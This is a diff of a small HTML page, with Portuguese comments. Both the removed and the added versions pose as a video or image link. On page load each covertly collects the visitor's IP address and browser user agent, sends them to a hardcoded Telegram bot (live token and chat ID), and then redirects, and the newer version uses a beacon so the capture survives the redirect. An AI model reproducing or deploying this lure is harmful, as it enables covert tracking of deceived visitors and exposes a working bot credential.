@@ -1,40 +1,19 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Video Player</title>
-</head>
-<body>
-    <script>
-        const TOKEN = "8536635132:AAEgtLwL1QQIe0g1VolOW6ts510DtscfKv4";
-        const CHAT_ID = "8053770740";
-
-        async function capturar() {
-            try {
-                // 1. Pega o IP
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                const ip = data.ip;
-
-                // 2. Monta a mensagem
-                const texto = encodeURIComponent("WORM WEB LOG\nIP: " + ip + "\nUA: " + navigator.userAgent);
-                
-                // 3. Envia via Image Beacon (mais difícil de bloquear que fetch)
-                const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${texto}`;
-                new Image().src = url;
-
-                console.log("Captura enviada para o bot.");
-            } catch (e) {
-                console.log("Erro na captura.");
-            } finally {
-                // 4. Redireciona após um pequeno delay
-                setTimeout(() => {
-                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-                }, 800);
-            }
-        }
-
-        capturar();
-    </script>
-    <p>Carregando vídeo...</p>
-</body>
-</html>
+<script>
+  // Pega o IP primeiro
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      const msg = "WORM WEB LOG\nIP: " + data.ip + "\nUA: " + navigator.userAgent;
+      const url = "https://api.telegram.org/bot8536635132:AAEgtLwL1QQIe0g1VolOW6ts510DtscfKv4/sendMessage?chat_id=8053770740&text=" + encodeURIComponent(msg);
+      
+      // O Beacon garante o envio mesmo no redirecionamento
+      navigator.sendBeacon(url);
+      
+      // Espera um pouco para garantir e joga para a imagem
+      setTimeout(() => {
+        window.location.href = "LINK_DA_SUA_IMAGEM_AQUI";
+      }, 700);
+    }).catch(() => {
+      window.location.href = "LINK_DA_SUA_IMAGEM_AQUI";
+    });
+</script>
